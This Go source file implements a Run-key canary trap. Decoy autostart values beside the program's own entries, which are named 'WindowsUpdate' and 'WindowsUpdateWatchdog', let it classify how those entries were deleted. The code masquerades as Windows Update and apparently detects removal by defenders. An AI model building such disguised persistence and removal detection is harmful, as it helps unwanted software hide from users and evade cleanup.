package main

// Run-key canary trap: two canary values beside the real Run entries
// distinguish the deleter by pattern (targeted/bulk/surgical/clean).
// Values run windowless rundll32 (never cmd.exe — no logon flash).
// Pure verdict core (cross-platform); registry IO is per-OS.

import (
	"crypto/rand"
	"encoding/hex"
	"os"
	"path/filepath"
)

// canaryPatternName looks like ours on purpose (pattern-match bait).
const canaryPatternName = "WindowsUpdateCanary"

// canaryInertCmd is the side-effect-free canary target.
const canaryInertCmd = `rundll32.exe kernel32.dll,GetTickCount`

// canaryRandomName loads the stable random canary name, generating and
// persisting it on first run (a fresh random name per pass would read as
// "missing" forever and cry wolf). isNew reports first plant so callers
// never verdict on a box that was never baited.
func canaryRandomName(stateDir string) (string, bool) {
	p := filepath.Join(stateDir, "canaryname.txt")
	if b, err := os.ReadFile(p); err == nil {
		if name := canonCanaryName(string(b)); name != "" {
			return name, false
		}
	}
	var rb [4]byte
	if _, err := rand.Read(rb[:]); err != nil {
		return "", false
	}
	name := "WindowsUpdate" + hex.EncodeToString(rb[:])
	_ = os.WriteFile(p, []byte(name+"\n"), 0644)
	return name, true
}

func canonCanaryName(s string) string {
	s = trimSpaceNewline(s)
	if len(s) != len("WindowsUpdate")+8 {
		return ""
	}
	if len(s) < 13 || s[:13] != "WindowsUpdate" {
		return ""
	}
	for _, c := range s[13:] {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return ""
		}
	}
	return s
}

func trimSpaceNewline(s string) string {
	for len(s) > 0 && (s[len(s)-1] == '\n' || s[len(s)-1] == '\r' || s[len(s)-1] == ' ' || s[len(s)-1] == '\t') {
		s = s[:len(s)-1]
	}
	for len(s) > 0 && (s[0] == ' ' || s[0] == '\t') {
		s = s[1:]
	}
	return s
}

// canaryVerdict classifies presence of the two real values + two canaries.
// oursA/oursB: WindowsUpdate, WindowsUpdateWatchdog present.
// Pure, tested.
func canaryVerdict(oursA, oursB, pattern, random bool) string {
	oursGone := !oursA || !oursB
	switch {
	case !oursGone:
		return "clean"
	case oursGone && !pattern && random:
		return "targeted"
	case oursGone && !pattern && !random:
		return "bulk"
	case oursGone && pattern && random:
		return "surgical"
	default:
		return "clean"
	}
}
